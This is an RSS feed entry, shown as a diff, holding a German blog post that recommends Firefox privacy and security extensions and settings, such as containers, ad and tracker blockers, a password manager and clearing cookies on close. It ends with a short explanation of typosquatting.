+In diesem Blogbeitrag zeige ich ein paar Mittel, um das alltägliche Browsen im Internet sicherer zu machen.&lt;br&gt;
+Mein Browser ist zwar auf Englisch eingestellt, ich werde jedoch in diesem Blogbeitrag jeweils die deutschsprachigen
+Informationen verlinken.&lt;/p&gt;
+&lt;h3 id=&#34;warum-firefox-und-nicht-zb-chrome&#34;&gt;Warum Firefox und nicht z.B. Chrome?&lt;/h3&gt;
+&lt;p&gt;Viele dieser Einstellungen und Erweiterungen sind zwar auch für Chrome verfügbar, jedoch fehlt die meiner Meinung nach
+wichtigste Erweiterung, Multi Account Containers, bis jetzt in Chromium-basierten Browsern.&lt;/p&gt;
+&lt;h2 id=&#34;wichtige-erweiterungen&#34;&gt;Wichtige Erweiterungen&lt;/h2&gt;
+&lt;h3 id=&#34;1-multi-account-containershttpsaddonsmozillaorgde-defirefoxaddonmulti-account-containers&#34;&gt;1. &lt;a href=&#34;https://addons.mozilla.org/de-DE/firefox/addon/multi-account-containers/&#34;&gt;Multi Account Containers&lt;/a&gt;&lt;/h3&gt;
+&lt;p&gt;Meiner Meinung nach die wichtigste Browsererweiterung, und auch der Grund, warum Firefox der hierfür am besten geeignete
+Browser ist. Hiermit kann man bestimmte Tabs quasi in ihrer eigenen Browsersitzung laufen lassen. Ich habe hier z.B. für
+alle Websites, die ich regelmäßig besuche und benutze einen eigenen Container, sodass deren Credentials nicht außerhalb
+des Containers verfügbar sind. Diese Erweiterung erschwert auch das Tracking etwas.&lt;/p&gt;
+&lt;h3 id=&#34;2-facebook-containerhttpsaddonsmozillaorgde-defirefoxaddonfacebook-container&#34;&gt;2. &lt;a href=&#34;https://addons.mozilla.org/de-DE/firefox/addon/facebook-container/&#34;&gt;Facebook Container&lt;/a&gt;&lt;/h3&gt;
+&lt;p&gt;Quasi ein Addon für das Addon &amp;ldquo;Multi Account Containers&amp;rdquo;, das einen vorgefertigten Container für Facebook-Dienste
+bereitstellt.&lt;/p&gt;
+&lt;h3 id=&#34;3-ublock-originhttpsaddonsmozillaorgde-defirefoxaddonublock-origin&#34;&gt;3. &lt;a href=&#34;https://addons.mozilla.org/de-DE/firefox/addon/ublock-origin/&#34;&gt;uBlock Origin&lt;/a&gt;&lt;/h3&gt;
+&lt;p&gt;uBlock ist vermutlich der effektivste Ad- und Trackerblocker, den es momentan gibt. Der Hauptgrund einen Adblocker zu
+nutzen, ist aber weniger, um Werbung an sich zu blockieren (Die Werbung auf bekannten Websites ist in der Regel
+harmlos), sondern um Tracker (Tracking-Pixel u.a.) sowie fragwürdigere Werbung zu blockieren.&lt;br&gt;
+Das Problem mit aktueller Internet-Werbung ist, dass hier effektiv beliebiges Javascript von Höchstbietenden im Browser
+ausgeführt wird, mit wenig Überprüfung, ob dieser Code tatsächlich nur das tut, was angegeben wird. Hier sind besonders
+Cryptominer beliebt, es werde aber auch immer wieder Credential Stealer auf diesem Weg verteilt, insbesondere auf
+Websites, die keine ausreichend restriktiven Cookie-Einstellungen haben.&lt;/p&gt;
+&lt;h3 id=&#34;4-privacy-badgerhttpsaddonsmozillaorgde-defirefoxaddonprivacy-badger17&#34;&gt;4. &lt;a href=&#34;https://addons.mozilla.org/de-DE/firefox/addon/privacy-badger17/&#34;&gt;Privacy Badger&lt;/a&gt;&lt;/h3&gt;
+&lt;p&gt;Privacy Badger ist ein Tracking-Blocker von der EFF. uBlock Origin deckt diese Funktionalität zwar weitestgehend ab, ich
+habe jedoch die Erfahrung gemacht, dass Privacy Badger mehr Tracker findet als uBlock.&lt;/p&gt;
+&lt;h3 id=&#34;5-passwort-manager-ihres-vertrauens&#34;&gt;5. Passwort-Manager Ihres Vertrauens&lt;/h3&gt;
+&lt;p&gt;Dies ist in meinem Fall Bitwarden, wofür ich meinen eingenen Vault hoste, kann aber auch z.B. KeePass sein. Der große
+Vorteil davon, die Browsererweiterung seines Passwort-Managers zu nutzen anstatt die Zugangsdaten von Hand in das
+Formular zu kopieren ist, dass das ausfüllen auf Knopfdruck bei &amp;ldquo;typosquatted&amp;rdquo;-Domains nicht funktioniert.&lt;/p&gt;
+&lt;h2 id=&#34;wichtige-einstellungen&#34;&gt;Wichtige Einstellungen&lt;/h2&gt;
+&lt;h3 id=&#34;1-cookies-und-daten-beim-schließen-des-browsers-löschen&#34;&gt;1. Cookies und Daten beim Schließen des Browsers löschen&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&#34;https://support.mozilla.org/de/kb/webseitendaten-einige-websites-mochten-dateien-auf&#34;&gt;Supportseite&lt;/a&gt;
+Cookies und gecachte Daten beim schließen des Browsers zu löschen macht nicht nur Tracking schwieriger, sondern
+ist auch ein guter Schritt, um Account Highjacking oder ähnliches zu verhindern. Wenn man nicht automatisch eingeloggt
+wird, kann man seinen Account auch nicht in einem einzelnen Klick kompromittieren.&lt;br&gt;
+Wenn man sich auf bestimmten Websites z.B. YouTube, Github, Discord, Facebook&amp;hellip; ohnehin in jeder Session einloggt, kann
+man auch für diese Ausnahmen erstellen, insbesondere falls man sie immer in Multi Account Containern verwendet.
+(hierbei ist es Hilfreich, darauf zu achten, die richtige Domain für Authentication Cookies freizuschalten,
+z.B. für YouTube/Google accounts.google.com)&lt;/p&gt;
+&lt;h3 id=&#34;2-datensammlung-von-firefox-selbst-deaktivieren&#34;&gt;2. Datensammlung von Firefox selbst deaktivieren&lt;/h3&gt;
+&lt;p&gt;Selbst wenn man Mozilla selbst 100% vertraut, ist es trotzdem sinnvoll, die Datensammlung von Firefox im normalen
+Betrieb zu deaktivieren. Einerseits verringert es unnötigen Traffic, und andererseits können Daten, die nie gesammelt
+wurden, auch nicht geleakt werden.&lt;/p&gt;
+&lt;h3 id=&#34;3-firefox-internen-autofill-loginskreditkarten-deaktivieren-falls-nicht-als-pw-manager-verwendet&#34;&gt;3. Firefox-Internen Autofill (Logins/Kreditkarten) deaktivieren (Falls nicht als PW-Manager verwendet)&lt;/h3&gt;
+&lt;p&gt;Ein Passwort-Manager reicht, und es ist nicht sinnvoll, seine Logindaten (auch verschlüsselt) mehr Parteien
+anzuvertrauen als unbedingt notwendig.
+Der einzige Haken, der hier gesetzt bleiben kann, ist &amp;ldquo;Breach Alerts&amp;rdquo; (Warnungen vor Datenlecks). Diese Funktion kann
+einen auf geleakte Zugangsdaten hinweisen. Alternativ kann auch die eigene Email-Addresse bei
+&lt;a href=&#34;https://haveibeenpwned.com/&#34;&gt;Have I Been Pwned&lt;/a&gt; hinterlegt werden.&lt;/p&gt;
+&lt;h2 id=&#34;optionale-erweiterungen&#34;&gt;Optionale Erweiterungen&lt;/h2&gt;
+&lt;h3 id=&#34;1-editthiscookie2httpsaddonsmozillaorgdefirefoxaddonetc2&#34;&gt;1. &lt;a href=&#34;https://addons.mozilla.org/de/firefox/addon/etc2/&#34;&gt;EditThisCookie2&lt;/a&gt;&lt;/h3&gt;
+&lt;p&gt;Mit dieser Erweiterung kann man sich die Cookies einer Website ansehen, diese bearbeiten oder löschen.&lt;/p&gt;
+&lt;h3 id=&#34;2-umatrixhttpsaddonsmozillaorgdefirefoxaddonumatrix&#34;&gt;2. &lt;a href=&#34;https://addons.mozilla.org/de/firefox/addon/umatrix/&#34;&gt;uMatrix&lt;/a&gt;&lt;/h3&gt;
+&lt;p&gt;Eine Erweiterte Version von uBlock Origin, die deutlich mächtiger ist, aber auch viele Websites &amp;ldquo;kaputt&amp;rdquo; macht. Hiermit
+können bestimmte Website-Features blockiert oder erlaubt werden.&lt;/p&gt;
+&lt;h3 id=&#34;3-user-agent-switcherhttpsaddonsmozillaorgdefirefoxaddonuser-agent-string-switcher&#34;&gt;3. &lt;a href=&#34;https://addons.mozilla.org/de/firefox/addon/user-agent-string-switcher/&#34;&gt;User-Agent Switcher&lt;/a&gt;&lt;/h3&gt;
+&lt;p&gt;Mit dieser Erweiterung kann man seinen User-Agent auf den für einen anderen Browser und/oder für ein anderes
+Betriebssystem ändern. Dies kann nützlich sein, um drive-by Downloads zu entschärfen, vor allem aber um Features, die
+von der Website offiziell nur in bestimmten Browsern/Betriebssystemen aktiviert werden, auch in anderen Browsern und
+Betriebssystemen zu nutzen. Wenn eine Website nur Chrome auf Windows unterstützt, kann man sie so trotzdem z.B. mit Firefox
+auf Linux verwenden.&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;Erklärungen:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&amp;ldquo;typosquatting&amp;rdquo; ist das Verfahren, eine Domain zu registrieren, die aussieht wie die Domain des Ziels, in der
+Hoffnung, dass Opfer über Vertipper (&amp;ldquo;typo&amp;rdquo;) auf die Angreiferseite gelangen, oder bei einem Link nicht merken,
+dass er nicht auf die echte Website führt. Beispielsweise &amp;ldquo;goggle.com&amp;rdquo; statt &amp;ldquo;google.com&amp;rdquo;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;!-- raw HTML omitted --&gt;
+</content>
+    </item>
+    
+  </channel>
+</rss>
